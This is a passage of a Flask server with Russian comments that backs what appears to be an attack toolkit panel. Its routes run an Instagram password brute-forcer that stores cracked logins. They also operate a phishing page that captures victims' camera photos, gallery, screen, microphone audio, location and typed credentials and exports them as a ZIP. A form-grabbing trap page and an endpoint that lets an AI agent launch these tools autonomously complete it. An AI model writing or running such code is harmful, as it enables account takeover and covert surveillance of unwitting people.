        return jsonify({"canSend": True, "nextSmsAt": None})
    # SQLite: created_at как 'YYYY-MM-DD HH:MM:SS'
    try:
        created = datetime.strptime(last["created_at"], "%Y-%m-%d %H:%M:%S").replace(tzinfo=timezone.utc)
    except (ValueError, TypeError):
        created = datetime.now(timezone.utc)
    next_at = created + timedelta(hours=24)
    now = datetime.now(timezone.utc)
    if now >= next_at:
        return jsonify({"canSend": True, "nextSmsAt": None})
    return jsonify({"canSend": False, "nextSmsAt": next_at.isoformat()})


@app.route("/api/tools/instagram-bruter/run-status", methods=["GET"])
def api_instagram_bruter_run_status():
    """Живой вывод и статус текущего перебора (для опроса с фронта)."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"output": "", "done": True, "result": None, "error": "Инструмент не найден"})
    return jsonify(tool.get_run_status())


@app.route("/api/tools/instagram-bruter/stop", methods=["POST"])
def api_instagram_bruter_stop():
    """Остановить текущий перебор."""
    tool = get_tool("instagram-bruter")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


@app.route("/api/tools/grabcam/run-status", methods=["GET"])
def api_grabcam_run_status():
    """Статус Grabcam: ссылка Serveo или локальный URL. local_url подставляется по Host запроса для доступа из локальной сети."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "get_run_status"):
        return jsonify({"running": False, "link": None, "local_url": None, "error": "Инструмент не найден"})
    data = tool.get_run_status()
    if data.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        try:
            u = urlparse(data["local_url"])
            port = u.port or 3333
        except Exception:
            port = 3333
        data["local_url"] = "http://{}:{}".format(host, port)
    return jsonify(data)


@app.route("/api/tools/grabcam/session-stats", methods=["GET"])
def api_grabcam_session_stats():
    """Реальные данные сводки сессии: уникальные IP (устройства) и количество целей по данным из Photo и form_captures."""
    unique_ips = set()
    if os.path.isdir(_GRABCAM_PHOTO_DIR):
        for name in os.listdir(_GRABCAM_PHOTO_DIR):
            sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
            if os.path.isdir(sub) and ".." not in name and name.strip():
                unique_ips.add(name.strip())
    if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
        try:
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            for c in (data.get("captures") or []):
                ip = (c.get("ip") or "").strip()
                if ip:
                    unique_ips.add(ip)
        except (OSError, ValueError):
            pass
    count = len(unique_ips)
    return jsonify({"unique_ips": count, "targets": count})


@app.route("/api/tools/grabcam/stop", methods=["POST"])
def api_grabcam_stop():
    """Остановить Grabcam (PHP/Serveo)."""
    tool = get_tool("grabcam")
    if not tool or not hasattr(tool, "stop_run"):
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


# Корень проекта уже задан вверху
_GRABCAM_PHOTO_DIR = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "Photo")


@app.route("/api/tools/grabcam/photos", methods=["GET"])
def api_grabcam_photos():
    """Список последних снятых фото: задняя (back) и передняя (front) камера, галерея. Экран — отдельный endpoint."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"photos": [], "total": 0, "unique_devices": 0})
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    allowed_cameras = ("back", "front", "gallery")
    photos = []
    for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
        for f in files:
            if f.lower().endswith((".png", ".jpg", ".jpeg")):
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                except OSError:
                    mtime = 0
                rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR)
                if ".." in rel or rel.startswith("/"):
                    continue
                rel_norm = rel.replace("\\", "/")
                parts = rel_norm.split("/")
                ip = parts[0] if len(parts) >= 1 else ""
                camera = parts[1] if len(parts) >= 2 else ""
                if camera not in allowed_cameras:
                    continue
                photos.append({"path": rel_norm, "mtime": mtime, "ip": ip, "camera": camera})
    photos.sort(key=lambda x: -x["mtime"])
    total_all = len(photos)
    unique_ips = len(set(p["ip"] for p in photos))
    photos = photos[:limit]
    for p in photos:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({
        "photos": photos,
        "total": total_all,
        "unique_devices": unique_ips,
    })


@app.route("/api/tools/grabcam/photo", methods=["GET"])
def api_grabcam_photo():
    """Отдать одно фото из папки Photo. Query: path=IP/front/file.png"""
    photo_path = (request.args.get("path") or "").strip()
    if not photo_path or ".." in photo_path or photo_path.startswith("/") or "\\" in photo_path:
        return "", 404
    photo_path = photo_path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, photo_path)


def _collect_media_by_type(media_type, allowed_extensions):
    """Собирает файлы из Photo/IP/media_type/ (screen или audio)."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return []
    items = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        type_dir = os.path.join(sub, media_type)
        if not os.path.isdir(type_dir) or ".." in name:
            continue
        for f in os.listdir(type_dir):
            if not any(f.lower().endswith(ext) for ext in allowed_extensions):
                continue
            full = os.path.join(type_dir, f)
            try:
                mtime = os.path.getmtime(full)
            except OSError:
                mtime = 0
            rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR).replace("\\", "/")
            items.append({"path": rel, "mtime": mtime, "ip": name})
    return items


@app.route("/api/tools/grabcam/screen", methods=["GET"])
def api_grabcam_screen():
    """Список захватов экрана (Photo/IP/screen/)."""
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    items = _collect_media_by_type("screen", (".png", ".jpg", ".jpeg"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/audio", methods=["GET"])
def api_grabcam_audio():
    """Список записей микрофона (Photo/IP/audio/)."""
    limit = min(int(request.args.get("limit", 50) or 50), 150)
    items = _collect_media_by_type("audio", (".webm", ".mp4", ".ogg", ".wav"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/file?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/file", methods=["GET"])
def api_grabcam_file():
    """Отдать файл из Photo (аудио и т.д.)."""
    path = (request.args.get("path") or "").strip()
    if not path or ".." in path or path.startswith("/") or "\\" in path:
        return "", 404
    path = path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, path)


def _parse_geo_info(content):
    """Парсит geo_info.txt в словарь."""
    d = {"ip": "", "country": "", "region": "", "city": "", "lat": "", "lon": "", "isp": "", "last_update": ""}
    for line in content.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key, val = key.strip().lower(), val.strip()
        if key == "ip":
            d["ip"] = val
        elif key == "country":
            d["country"] = val
        elif key == "region":
            d["region"] = val
        elif key == "city":
            d["city"] = val
        elif key == "latitude":
            d["lat"] = val
        elif key == "longitude":
            d["lon"] = val
        elif key == "isp":
            d["isp"] = val
        elif key == "last update":
            d["last_update"] = val
    return d


@app.route("/api/tools/grabcam/locations", methods=["GET"])
def api_grabcam_locations():
    """Список IP и местоположений из Photo/*/geo_info.txt."""
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"locations": []})
    locations = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        if not os.path.isdir(sub) or ".." in name:
            continue
        geo_file = os.path.join(sub, "geo_info.txt")
        if not os.path.isfile(geo_file):
            continue
        try:
            with open(geo_file, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError:
            continue
        geo = _parse_geo_info(content)
        geo["device_id"] = name
        try:
            mtime = os.path.getmtime(geo_file)
            geo["mtime"] = mtime
        except OSError:
            geo["mtime"] = 0
        locations.append(geo)
    locations.sort(key=lambda x: -x["mtime"])
    return jsonify({"locations": locations})


_GRABCAM_FORM_CAPTURES_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "form_captures.json")
_GRABCAM_OPTIONS_FILE = os.path.join(_PROJECT_ROOT, "tools", "grabcam", "options.json")


@app.route("/api/tools/grabcam/options", methods=["GET"])
def api_grabcam_options_get():
    """Текущие опции (камера, гео, форма, галерея, микрофон, экран). Меняются на лету без перезапуска."""
    default = {"camera": True, "geo": True, "form": True, "gallery": False, "mic": False, "screen": False}
    if not os.path.isfile(_GRABCAM_OPTIONS_FILE):
        return jsonify(default)
    try:
        with open(_GRABCAM_OPTIONS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        for k in default:
            if k in data and isinstance(data[k], bool):
                default[k] = data[k]
    except (OSError, ValueError):
        pass
    return jsonify(default)


@app.route("/api/tools/grabcam/options", methods=["POST"])
def api_grabcam_options_post():
    """Сохранить опции. Страница фишинга подхватывает их без перезапуска."""
    data = request.get_json(silent=True) or {}
    options = {
        "camera": bool(data.get("camera", True)),
        "geo": bool(data.get("geo", True)),
        "form": bool(data.get("form", True)),
        "gallery": bool(data.get("gallery", False)),
        "mic": bool(data.get("mic", False)),
        "screen": bool(data.get("screen", False)),
    }
    try:
        with open(_GRABCAM_OPTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(options, f, ensure_ascii=False, indent=2)
    except OSError:
        return jsonify({"success": False, "error": "Не удалось записать файл"}), 500
    return jsonify({"success": True, "options": options})


@app.route("/api/tools/grabcam/form-captures", methods=["GET"])
def api_grabcam_form_captures():
    """Введённые данные с формы входа на странице фишинга (одна ссылка Grabcam)."""
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    captures = []
    if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
        try:
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            captures = (data.get("captures") or [])[-limit:]
            captures = list(reversed(captures))
        except (OSError, ValueError):
            pass
    return jsonify({"captures": captures})


def _build_grabcam_export_zip():
    """Собирает ZIP: Photo/, form_captures.json, report.txt."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        if os.path.isfile(_GRABCAM_FORM_CAPTURES_FILE):
            with open(_GRABCAM_FORM_CAPTURES_FILE, "r", encoding="utf-8", errors="replace") as f:
                zf.writestr("form_captures.json", f.read())
        report_lines = ["Grabcam Export Report", "=====================", ""]
        if os.path.isdir(_GRABCAM_PHOTO_DIR):
            for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
                for f in files:
                    full = os.path.join(root, f)
                    rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR)
                    arcname = "Photo/" + rel.replace("\\", "/")
                    try:
                        zf.write(full, arcname)
                    except OSError:
                        pass
            for name in os.listdir(_GRABCAM_PHOTO_DIR):
                sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
                if os.path.isdir(sub) and ".." not in name:
                    report_lines.append(f"Device: {name.replace('_', '.')}")
                    report_lines.append(f"  Folder: Photo/{name}/")
                    report_lines.append("")
        zf.writestr("report.txt", "\n".join(report_lines))
    buf.seek(0)
    return buf.getvalue()


@app.route("/api/tools/grabcam/export", methods=["GET"])
def api_grabcam_export():
    """Скачать все данные Grabcam одним ZIP-архивом."""
    try:
        data = _build_grabcam_export_zip()
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    return send_file(
        io.BytesIO(data),
        mimetype="application/zip",
        as_attachment=True,
        download_name="grabcam_export.zip",
    )


@app.route("/api/tools/instagram-bruter/tried-count", methods=["GET"])
def api_instagram_bruter_tried_count():
    """Количество уже проверенных паролей для аккаунта (?username=xxx)."""
    from db import get_instagram_tried_count
    username = (request.args.get("username") or "").strip()
    return jsonify({"count": get_instagram_tried_count(username)})


@app.route("/api/tools/instagram-bruter/clear-tried", methods=["POST"])
def api_instagram_bruter_clear_tried():
    """Сбросить учёт проверенных паролей для аккаунта (чтобы можно было повторить те же пароли)."""
    from db import clear_instagram_tried_passwords
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    if not username:
        return jsonify({"success": False, "error": "Укажите имя аккаунта."})
    clear_instagram_tried_passwords(username)
    return jsonify({"success": True, "message": "Проверенные пароли для этого аккаунта сброшены."})


@app.route("/api/tools/instagram-bruter/found-list", methods=["GET"])
def api_instagram_bruter_found_list():
    """Список найденных учёток (логин/пароль) для отображения в панели."""
    from db import get_instagram_found_list
    limit = min(int(request.args.get("limit", 50) or 50), 200)
    return jsonify({"found": get_instagram_found_list(limit=limit)})


@app.route("/api/tools/instagram-bruter/refresh-lists", methods=["POST"])
def api_instagram_bruter_refresh_lists():
    """Скачать и сохранить списки паролей и прокси для офлайн-работы."""
    tool = get_tool("instagram-bruter")
    if not tool:
        return jsonify({"success": False, "error": "Инструмент не найден"})
    ok_w, msg_w = tool.download_wordlist()
    ok_p, msg_p = tool.refresh_proxy_list()
    return jsonify({
        "success": ok_w and ok_p,
        "wordlist": {"ok": ok_w, "message": msg_w},
        "proxies": {"ok": ok_p, "message": msg_p},
    })


# --- Form Grabber ---
@app.route("/api/tools/formgrab/url", methods=["GET"])
def api_formgrab_url():
    """Создать новую ссылку для захвата форм. Возвращает token и url."""
    token = get_or_create_token()
    url = request.host_url.rstrip("/") + "/grab/" + token
    return jsonify({"token": token, "url": url})


@app.route("/api/tools/formgrab/capture", methods=["POST"])
def api_formgrab_capture():
    """Принять введённые данные с страницы-ловушки."""
    data = request.get_json(silent=True) or {}
    token = (data.get("token") or "").strip()
    field = (data.get("field") or "").strip()
    value = (data.get("value") or "").strip()
    ip = request.remote_addr or ""
    if not token:
        return jsonify({"success": False, "error": "token required"}), 400
    add_capture(token, field, value, ip)
    return jsonify({"success": True})


@app.route("/api/tools/formgrab/captures", methods=["GET"])
def api_formgrab_captures():
    """Список захваченных вводов для токена."""
    token = (request.args.get("token") or "").strip()
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    if not token:
        return jsonify({"captures": []})
    return jsonify({"captures": get_captures(token, limit=limit)})


# --- AI Agent (помощник OSINT/Pentest) ---
@app.route("/api/ai/status", methods=["GET"])
def api_ai_status():
    """Доступен ли ИИ-помощник (настроен ли ключ или Ollama)."""
    try:
        from ai_agent import is_ai_available
        return jsonify({"available": is_ai_available()})
    except ImportError:
        return jsonify({"available": False})


@app.route("/api/ai/chat", methods=["POST"])
def api_ai_chat():
    """Чат с ИИ-агентом. ИИ может сам запускать инструменты (ACTION/PARAMS). Body: { "message", "context", "history" }."""
    try:
        from ai_agent import chat_with_tools
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    data = request.get_json(silent=True) or {}
    message = (data.get("message") or "").strip()
    if not message:
        return jsonify({"success": False, "error": "Укажите message."}), 400
    result = chat_with_tools(
        user_message=message,
        context=(data.get("context") or "")[:5000],
        history=data.get("history") or [],
        run_tool_fn=run_tool,
        max_tool_steps=15,
    )
    return jsonify(result)


@app.route("/api/ai/suggest", methods=["POST"])
def api_ai_suggest():
    """Подсказки «что делать дальше» по контексту. Body: { "context": "..." }."""
    try:
        from ai_agent import suggest_next_steps
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    data = request.get_json(silent=True) or {}
    context = (data.get("context") or "").strip()
    return jsonify(suggest_next_steps(context))


@app.route("/api/ai/automate", methods=["POST"])
def api_ai_automate():
    """
    Автономное выполнение: ИИ по цели сам запускает инструменты по очереди.
    Body: { "goal": "разведай домен example.com", "max_steps": 10 }.
    """
    try:
        from ai_agent import get_next_action, is_ai_available
    except ImportError:
        return jsonify({"success": False, "error": "Модуль ИИ не найден"}), 500
    if not is_ai_available():
        return jsonify({"success": False, "error": "ИИ не настроен. Укажите OLLAMA_URL или AI_OPENAI_API_KEY."}), 400
    data = request.get_json(silent=True) or {}
    goal = (data.get("goal") or "").strip()
    if not goal:
        return jsonify({"success": False, "error": "Укажите goal (цель)."}), 400
    max_steps = max(1, min(15, int(data.get("max_steps") or 10)))
    state = {"goal": goal, "steps": []}
    for _ in range(max_steps):
        action = get_next_action(goal, state)
        if action.get("done"):
            return jsonify({
                "success": True,
                "steps": state["steps"],
                "summary": action.get("summary", ""),
                "finished": True,
            })
        tool_id = (action.get("tool_id") or "").strip()
        params = action.get("params") or {}
        if not tool_id:
            return jsonify({
                "success": True,
                "steps": state["steps"],
                "summary": "Агент не указал инструмент.",
                "finished": True,
            })
        result = run_tool(tool_id, params)
        output_full = (result.get("output") or result.get("error") or "")
        output_preview = (output_full[:2000] + "…") if len(output_full) > 2000 else output_full
        state["steps"].append({
            "tool_id": tool_id,
            "params": params,
            "success": bool(result.get("success")),
            "error": result.get("error"),
            "output_preview": output_preview,
        })
    return jsonify({
        "success": True,
        "steps": state["steps"],
        "summary": f"Достигнут лимит шагов ({max_steps}). Итог по последним результатам — см. шаги.",
        "finished": True,
    })


@app.route("/api/settings/keys", methods=["GET"])
def api_settings_keys_get():
    """Список ключей с подсказками и замаскированными значениями."""
    return jsonify(get_keys_for_api())


@app.route("/api/settings/keys", methods=["POST"])
def api_settings_keys_post():
    """Сохранить ключи в .env. Body: { "TEXTBELT_API_KEY": "xxx", ... }."""
    data = request.get_json(silent=True) or {}
    save_keys_from_api(data)
    load_env_into_os()
    return jsonify({"success": True})


@app.route("/<path:path>")
def static_files(path):
    """Статика из static/ — только после всех /api и прочих явных маршрутов."""
    return send_from_directory(app.static_folder, path)


if __name__ == "__main__":
    os.makedirs(os.path.join(os.path.dirname(__file__), "..", "static"), exist_ok=True)
    app.run(host="0.0.0.0", port=5000, debug=True)
